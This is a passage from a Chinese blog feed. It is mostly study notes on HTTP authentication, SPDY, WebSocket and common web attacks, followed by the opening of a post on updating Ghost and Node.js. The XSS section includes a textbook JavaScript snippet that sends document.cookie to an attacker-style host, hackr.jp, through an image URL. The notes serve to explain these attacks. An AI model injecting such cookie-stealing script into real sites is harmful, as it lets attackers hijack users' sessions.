<p>&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x5DF2;&#x4E8B;&#x5148;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;ID&#xFF08;&#x901A;&#x5E38;&#x662F;&#x4EFB;&#x610F;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#xFF09;&#x548C;&#x5BC6;&#x7801;&#x7B49;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x57FA;&#x4E8E;&#x8BA4;&#x8BC1;&#x7ED3;&#x679C;&#x6765;&#x51B3;&#x5B9A;&#x8BA4;&#x8BC1;&#x662F;&#x5426;&#x6210;&#x529F;&#x3002;</p>
<p>&#x5BA2;&#x6237;&#x7AEF;&#x628A;&#x7528;&#x6237;ID&#x548C;&#x5BC6;&#x7801;&#x7B49;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x653E;&#x5165;&#x62A5;&#x6587;&#x7684;&#x5B9E;&#x4F53;&#x90E8;&#x5206;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x4EE5;POST&#x65B9;&#x6CD5;&#x628A;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x3002;&#x800C;&#x8FD9;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;HTTPS&#x901A;&#x4FE1;&#x6765;&#x8FDB;&#x884C;HTML&#x8868;&#x5355;&#x753B;&#x9762;&#x7684;&#x663E;&#x793A;&#x548C;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6570;&#x636E;&#x7684;&#x53D1;&#x9001;&#x3002;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x53D1;&#x653E;&#x7528;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x7684;Session ID&#x3002;&#x901A;&#x8FC7;&#x9A8C;&#x8BC1;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x767B;&#x5F55;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x8BA4;&#x8BC1;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7528;&#x6237;&#x7684;&#x8BA4;&#x8BC1;&#x72B6;&#x6001;&#x4E0E;Session ID&#x7ED1;&#x5B9A;&#x540E;&#x8BB0;&#x5F55;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Set-Cookie&#x5185;&#x5199;&#x5165;Session ID&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x4E3A;&#x51CF;&#x8F7B;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#xFF08;XSS&#xFF09;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;&#xFF0C;&#x5EFA;&#x8BAE;&#x4E8B;&#x5148;&#x5728;Cookie&#x5185;&#x52A0;&#x4E0A;httponly&#x5C5E;&#x6027;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x6765;&#x7684;Session ID&#x540E;&#xFF0C;&#x4F1A;&#x5C06;&#x5176;&#x4F5C;&#x4E3A;Cookie&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x3002;&#x4E0B;&#x6B21;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x81EA;&#x52A8;&#x53D1;&#x9001;Cookie&#xFF0C;&#x6240;&#x4EE5;Session ID&#x4E5F;&#x968F;&#x4E4B;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53EF;&#x901A;&#x8FC7;&#x9A8C;&#x8BC1;&#x63A5;&#x6536;&#x5230;&#x7684;Session ID&#x8BC6;&#x522B;&#x7528;&#x6237;&#x548C;&#x5176;&#x8BA4;&#x8BC1;&#x72B6;&#x6001;&#x3002;</p>
<h2 id="%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE">&#x57FA;&#x4E8E;HTTP&#x7684;&#x529F;&#x80FD;&#x8FFD;&#x52A0;&#x534F;&#x8BAE;</h2>
<p>&#x5728;&#x5EFA;&#x7ACB;HTTP&#x6807;&#x51C6;&#x89C4;&#x8303;&#x65F6;&#xFF0C;&#x5236;&#x8BA2;&#x8005;&#x4E3B;&#x8981;&#x60F3;&#x628A;HTTP&#x5F53;&#x4F5C;&#x4F20;&#x8F93;HTML&#x6587;&#x6863;&#x7684;&#x534F;&#x8BAE;&#x3002;HTTP&#x529F;&#x80FD;&#x4E0A;&#x7684;&#x4E0D;&#x8DB3;&#x53EF;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x4E00;&#x5957;&#x5168;&#x65B0;&#x7684;&#x534F;&#x8BAE;&#x6765;&#x5F25;&#x8865;&#x3002;&#x53EF;&#x662F;&#x76EE;&#x524D;&#x57FA;&#x4E8E;HTTP&#x7684;Web&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4F7F;&#x7528;&#x73AF;&#x5883;&#x5DF2;&#x904D;&#x5E03;&#x5168;&#x7403;&#xFF0C;&#x56E0;&#x6B64;&#x65E0;&#x6CD5;&#x5B8C;&#x5168;&#x629B;&#x5F03;HTTP&#x3002;&#x6709;&#x4E00;&#x4E9B;&#x65B0;&#x534F;&#x8BAE;&#x7684;&#x89C4;&#x5219;&#x662F;&#x57FA;&#x4E8E;HTTP&#x7684;&#xFF0C;&#x5E76;&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#x6DFB;&#x52A0;&#x4E86;&#x65B0;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
<h3 id="%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy">&#x6D88;&#x9664;HTTP&#x74F6;&#x9888;&#x7684;SPDY</h3>
<p>&#x5F53;&#x51E0;&#x767E;&#x3001;&#x51E0;&#x5343;&#x4E07;&#x7684;&#x7528;&#x6237;&#x53D1;&#x5E03;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;Web&#x7F51;&#x7AD9;&#x4E3A;&#x4E86;&#x4FDD;&#x5B58;&#x8FD9;&#x4E9B;&#x65B0;&#x589E;&#x5185;&#x5BB9;&#xFF0C;&#x5728;&#x5F88;&#x77ED;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x5C31;&#x4F1A;&#x53D1;&#x751F;&#x5927;&#x91CF;&#x7684;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#x3002;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x5B9E;&#x65F6;&#x5730;&#x663E;&#x793A;&#x8FD9;&#x4E9B;&#x66F4;&#x65B0;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E00;&#x6709;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x628A;&#x90A3;&#x4E9B;&#x5185;&#x5BB9;&#x53CD;&#x9988;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x754C;&#x9762;&#x4E0A;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x9700;&#x8981;Ajax&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x3002;Ajax&#xFF08;Asynchronous JavaScript and XML&#xFF0C;&#x5F02;&#x6B65;JavaScript&#x4E0E;XML&#x6280;&#x672F;&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x6709;&#x6548;&#x5229;&#x7528;JavaScript&#x548C;DOM&#xFF08;Document Object Model&#xFF0C;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x6A21;&#x578B;&#xFF09;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x5C40;&#x90E8;Web&#x9875;&#x9762;&#x66FF;&#x6362;&#x52A0;&#x8F7D;&#x7684;&#x5F02;&#x6B65;&#x901A;&#x4FE1;&#x624B;&#x6BB5;&#x3002;&#x548C;&#x4EE5;&#x524D;&#x7684;&#x540C;&#x6B65;&#x901A;&#x4FE1;&#x76F8;&#x6BD4;&#xFF0C;&#x7531;&#x4E8E;&#x53EA;&#x66F4;&#x65B0;&#x4E00;&#x90E8;&#x5206;&#x9875;&#x9762;&#xFF0C;&#x54CD;&#x5E94;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4F1A;&#x56E0;&#x6B64;&#x800C;&#x51CF;&#x5C11;&#xFF0C;&#x8FD9;&#x4E00;&#x4F18;&#x70B9;&#x663E;&#x800C;&#x6613;&#x89C1;&#x3002;&#x5904;&#x4E8E;&#x6301;&#x7EED;&#x5F00;&#x53D1;&#x72B6;&#x6001;&#x4E2D;&#x7684;SPDY&#x534F;&#x8BAE;&#xFF0C;&#x6B63;&#x662F;&#x4E3A;&#x4E86;&#x5728;&#x534F;&#x8BAE;&#x7EA7;&#x522B;&#x6D88;&#x9664;HTTP&#x6240;&#x906D;&#x9047;&#x7684;&#x74F6;&#x9888;&#x3002;SPDY&#x4EE5;&#x4F1A;&#x8BDD;&#x5C42;&#x7684;&#x5F62;&#x5F0F;&#x52A0;&#x5165;&#xFF0C;&#x63A7;&#x5236;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x6D41;&#x52A8;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x91C7;&#x7528;HTTP&#x5EFA;&#x7ACB;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#x3002;</p>
<h3 id="%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket">&#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8FDB;&#x884C;&#x5168;&#x53CC;&#x5DE5;&#x901A;&#x4FE1;&#x7684;WebSocket</h3>
<p>&#x5229;&#x7528;Ajax&#x548C;Comet&#x6280;&#x672F;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x53EF;&#x4EE5;&#x63D0;&#x5347;Web&#x7684;&#x6D4F;&#x89C8;&#x901F;&#x5EA6;&#x3002;&#x4F46;&#x95EE;&#x9898;&#x5728;&#x4E8E;&#x901A;&#x4FE1;&#x82E5;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#xFF0C;&#x5C31;&#x65E0;&#x6CD5;&#x5F7B;&#x5E95;&#x89E3;&#x51B3;&#x74F6;&#x9888;&#x95EE;&#x9898;&#x3002;</p>
<p>WebSocket&#xFF0C;&#x5373;Web&#x6D4F;&#x89C8;&#x5668;&#x4E0E;Web&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x5168;&#x53CC;&#x5DE5;&#x901A;&#x4FE1;&#x6807;&#x51C6;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;Ajax&#x548C;Comet&#x91CC;XMLHttpRequest&#x9644;&#x5E26;&#x7684;&#x7F3A;&#x9677;&#x6240;&#x5F15;&#x8D77;&#x7684;&#x95EE;&#x9898;&#x3002;&#x4E00;&#x65E6;Web&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x8D77;WebSocket&#x534F;&#x8BAE;&#x7684;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#xFF0C;&#x4E4B;&#x540E;&#x6240;&#x6709;&#x7684;&#x901A;&#x4FE1;&#x90FD;&#x4F9D;&#x9760;&#x8FD9;&#x4E2A;&#x4E13;&#x7528;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x3002;&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#x53EF;&#x4E92;&#x76F8;&#x53D1;&#x9001;JSON&#x3001;XML&#x3001;HTML&#x6216;&#x56FE;&#x7247;&#x7B49;&#x4EFB;&#x610F;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x3002;&#x7531;&#x4E8E;&#x662F;&#x5EFA;&#x7ACB;&#x5728;HTTP&#x57FA;&#x7840;&#x4E0A;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x56E0;&#x6B64;&#x8FDE;&#x63A5;&#x7684;&#x53D1;&#x8D77;&#x65B9;&#x4ECD;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x800C;&#x4E00;&#x65E6;&#x786E;&#x7ACB;WebSocket&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#xFF0C;&#x4E0D;&#x8BBA;&#x670D;&#x52A1;&#x5668;&#x8FD8;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x90FD;&#x53EF;&#x76F4;&#x63A5;&#x5411;&#x5BF9;&#x65B9;&#x53D1;&#x9001;&#x62A5;&#x6587;&#x3002;</p>
<p>WebSocket&#x534F;&#x8BAE;&#x652F;&#x6301;&#x7531;&#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x63A8;&#x9001;&#x6570;&#x636E;&#x7684;&#x63A8;&#x9001;&#x529F;&#x80FD;&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x4E0D;&#x5FC5;&#x7B49;&#x5F85;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x3002;&#x5728;&#x51CF;&#x5C11;&#x901A;&#x4FE1;&#x91CF;&#x65B9;&#x9762;&#xFF0C;&#x53EA;&#x8981;&#x5EFA;&#x7ACB;&#x8D77;WebSocket&#x8FDE;&#x63A5;&#xFF0C;&#x5C31;&#x5E0C;&#x671B;&#x4E00;&#x76F4;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x3002;&#x548C;HTTP&#x76F8;&#x6BD4;&#xFF0C;&#x4E0D;&#x4F46;&#x6BCF;&#x6B21;&#x8FDE;&#x63A5;&#x65F6;&#x7684;&#x603B;&#x5F00;&#x9500;&#x51CF;&#x5C11;&#xFF0C;&#x800C;&#x4E14;&#x7531;&#x4E8E;WebSocket&#x7684;&#x9996;&#x90E8;&#x4FE1;&#x606F;&#x5F88;&#x5C0F;&#xFF0C;&#x901A;&#x4FE1;&#x91CF;&#x4E5F;&#x76F8;&#x5E94;&#x51CF;&#x5C11;&#x4E86;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;WebSocket&#x901A;&#x4FE1;&#xFF0C;&#x5728;HTTP&#x8FDE;&#x63A5;&#x5EFA;&#x7ACB;&#x4E4B;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x201C;&#x63E1;&#x624B;&#x201D;&#xFF08;Handshaking&#xFF09;&#x7684;&#x6B65;&#x9AA4;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;WebSocket&#x901A;&#x4FE1;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x5230;HTTP&#x7684;Upgrade&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x544A;&#x77E5;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x63E1;&#x624B;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5BF9;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;101 Switching Protocols&#x7684;&#x54CD;&#x5E94;&#x3002;&#x6210;&#x529F;&#x63E1;&#x624B;&#x786E;&#x7ACB;WebSocket&#x8FDE;&#x63A5;&#x4E4B;&#x540E;&#xFF0C;&#x901A;&#x4FE1;&#x65F6;&#x4E0D;&#x518D;&#x4F7F;&#x7528;HTTP&#x7684;&#x6570;&#x636E;&#x5E27;&#xFF0C;&#x800C;&#x91C7;&#x7528;WebSocket&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E27;&#x3002;</p>
<pre><code class="language-javascript">// JavaScript&#x8C03;&#x7528; &quot;The WebSocket API&quot;
// &#x6BCF;50ms&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x6570;&#x636E;
var socket = new WebSocket(&apos;ws://bingmeishi.example.com:123/updates&apos;);
socket.onopen = function () {
  setInterval(function() {
    if (socket.bufferedAmount == 0) socket.send(getUpdateData());
    }, 50);
};
</code></pre>
<h2 id="web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">Web&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x5177;&#x5907;&#x5B89;&#x5168;&#x529F;&#x80FD;&#xFF0C;&#x5373;&#x5E76;&#x4E0D;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x6B64;&#x534F;&#x8BAE;&#x672C;&#x8EAB;&#x51E0;&#x4E4E;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x653B;&#x51FB;&#x7684;&#x5BF9;&#x8C61;&#x3002;&#x5E94;&#x7528;HTTP&#x534F;&#x8BAE;&#x7684;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4EE5;&#x53CA;&#x8FD0;&#x884C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;Web&#x5E94;&#x7528;&#x7B49;&#x8D44;&#x6E90;&#x624D;&#x662F;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x3002;&#x5C31;&#x62FF;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x65F6;&#x4F1A;&#x7528;&#x5230;&#x7684;SSH&#x534F;&#x8BAE;&#x6765;&#x8BF4;&#xFF0C;SSH&#x5177;&#x5907;&#x534F;&#x8BAE;&#x7EA7;&#x522B;&#x7684;&#x8BA4;&#x8BC1;&#x53CA;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x7B49;&#x529F;&#x80FD;&#xFF0C;HTTP&#x534F;&#x8BAE;&#x5219;&#x6CA1;&#x6709;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x9700;&#x8981;&#x81EA;&#x884C;&#x8BBE;&#x8BA1;&#x5E76;&#x5F00;&#x53D1;&#x8BA4;&#x8BC1;&#x53CA;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x6765;&#x6EE1;&#x8DB3;Web&#x5E94;&#x7528;&#x7684;&#x5B89;&#x5168;&#x3002;</p>
<h3 id="%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F">&#x5E94;&#x7528;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;</h3>
<p>&#x4E3B;&#x52A8;&#x653B;&#x51FB; active attack &#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;Web&#x5E94;&#x7528;&#xFF0C;&#x628A;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x4F20;&#x5165;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x3002;&#x7531;&#x4E8E;&#x8BE5;&#x6A21;&#x5F0F;&#x662F;&#x76F4;&#x63A5;&#x9488;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x8D44;&#x6E90;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x56E0;&#x6B64;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x90A3;&#x4E9B;&#x8D44;&#x6E90;&#x3002;&#x4E3B;&#x52A8;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x91CC;&#x5177;&#x6709;&#x4EE3;&#x8868;&#x6027;&#x7684;&#x653B;&#x51FB;&#x662F;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x548C;OS&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x88AB;&#x52A8;&#x653B;&#x51FB; passive attack &#x662F;&#x6307;&#x5229;&#x7528;<strong>&#x5708;&#x5957;&#x7B56;&#x7565;</strong>&#x6267;&#x884C;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x3002;&#x5728;&#x88AB;&#x52A8;&#x653B;&#x51FB;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4E0D;&#x76F4;&#x63A5;&#x5BF9;&#x76EE;&#x6807;Web&#x5E94;&#x7528;&#x8BBF;&#x95EE;&#x53D1;&#x8D77;&#x653B;&#x51FB;&#xFF0C;&#x800C;&#x662F;&#x8BF1;&#x4F7F;&#x7528;&#x6237;&#x89E6;&#x53D1;&#x5DF2;&#x8BBE;&#x7F6E;&#x597D;&#x7684;&#x9677;&#x9631;&#xFF0C;&#x9677;&#x9631;&#x4F1A;&#x542F;&#x52A8;&#x53D1;&#x9001;&#x5DF2;&#x5D4C;&#x5165;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;HTTP&#x8BF7;&#x6C42;&#x3002;&#x5177;&#x6709;&#x4EE3;&#x8868;&#x6027;&#x7684;&#x653B;&#x51FB;&#x662F;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB; xss &#x548C;&#x8DE8;&#x7AD9;&#x70B9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020; csrf&#x3002;</p>
<p>&#x5176;&#x4E2D;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB; Cross-Site Scripting &#x662F;&#x6307;&#x901A;&#x8FC7;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7684; Web &#x7F51;&#x7AD9;&#x6CE8;&#x518C;&#x7528;&#x6237;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684;HTML&#x6807;&#x7B7E;&#x6216;JavaScript&#x8FDB;&#x884C;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#x3002;&#x5E38;&#x89C1;&#x4E8E;&#x865A;&#x5047;&#x8F93;&#x5165;&#x8868;&#x5355;&#x9A97;&#x53D6;&#x7528;&#x6237;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3001;&#x5229;&#x7528;&#x811A;&#x672C;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x7684;Cookie&#x503C;&#xFF0C;&#x88AB;&#x5BB3;&#x8005;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5E2E;&#x52A9;&#x653B;&#x51FB;&#x8005;&#x53D1;&#x9001;&#x6076;&#x610F;&#x8BF7;&#x6C42;&#x4EE5;&#x53CA;&#x663E;&#x793A;&#x4F2A;&#x9020;&#x7684;&#x6587;&#x7AE0;&#x6216;&#x56FE;&#x7247;&#x3002;</p>
<pre><code class="language-javascript">var content = escape(document.cookie);
document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
document.write(content);
document.write(&quot;&gt;&quot;)
</code></pre>
<p>SQL&#x6CE8;&#x5165;&#xFF08;SQL Injection&#xFF09;&#x662F;&#x6307;&#x9488;&#x5BF9;Web&#x5E94;&#x7528;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684;SQL&#x800C;&#x4EA7;&#x751F;&#x7684;&#x653B;&#x51FB;&#x3002;&#x901A;&#x5E38;&#x6709;&#x975E;&#x6CD5;&#x67E5;&#x770B;&#x6216;&#x7BE1;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7684;&#x6570;&#x636E;&#x3001;&#x89C4;&#x907F;&#x8BA4;&#x8BC1;&#x3001;&#x6267;&#x884C;&#x548C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E1A;&#x52A1;&#x5173;&#x8054;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;&#x540E;&#x679C;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Ghost 更新与迁移]]></title><description><![CDATA[Ubuntu 最近 Ghost 以及 Node 版本更新过程小结。]]></description><link>yourdomain.com/newghostzs/</link><guid isPermaLink="false">60fac2bca763a10c85416efc</guid><category><![CDATA[GHOSTblog]]></category><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Fri, 23 Jul 2021 13:38:41 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/09/ghostbg.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><img src="yourdomain.com/content/images/2021/09/ghostbg.png" alt="Ghost &#x66F4;&#x65B0;&#x4E0E;&#x8FC1;&#x79FB;"><p>&#x7531;&#x4E8E; Githubpage &#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684; Ghost &#x5728;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x4E0E;&#x6548;&#x679C;&#x4E0A;&#x7A0D;&#x900A;&#x4E8E;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x7684;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#xFF0C;&#x4E3A;&#x540C;&#x6B65;&#x9700;&#x6C42;&#xFF0C;&#x8BB0;&#x5F55;&#x672C;&#x6B21;&#x4E91;&#x670D;&#x52A1;&#x5668; Ubuntu &#x4E2D; Ghost &#x4E0E; Node &#x7248;&#x672C;&#x66F4;&#x65B0;&#x8FC7;&#x7A0B;&#x4EE5;&#x53CA; Nginx &#x914D;&#x7F6E;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="node">Node</h2>
<p>&#x6700;&#x65B0;&#x7684; Ghost &#x7248;&#x672C;&#x9700;&#x8981; Node.js 14.x &#xFF0C;&#x6545;&#x5B89;&#x88C5;&#x9002;&#x7528; Ubuntu &#x7684; <a href="https://github.com/nodesource/distributions">&#x4E8C;&#x8FDB;&#x5236;&#x53D1;&#x884C;&#x7248;</a>&#x3002;</p>
<pre><code class="language-shell"># Using Ubuntu &#x6DFB;&#x52A0; Node.js ppa(Person Package achives) &#x5B89;&#x88C5; Node.js
# cURL is an abbreviation for Client URL Request Library which is used to transfer data from one place to another place. 
# -f (--fail) &#x8868;&#x793A;&#x5728;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x65F6;, &#x963B;&#x6B62;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x8868;&#x793A;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#x7684; html &#x9875;&#x9762;
# -S (--show-error) &#x4F7F;curl&#x5728;&#x5931;&#x8D25;&#x65F6;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x6D88;&#x606F; -s (--silent) &#x4E0D;&#x663E;&#x793A;&#x8FDB;&#x5EA6;&#x8868;&#x6216;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x5B89;&#x9759;&#x6A21;&#x5F0F;
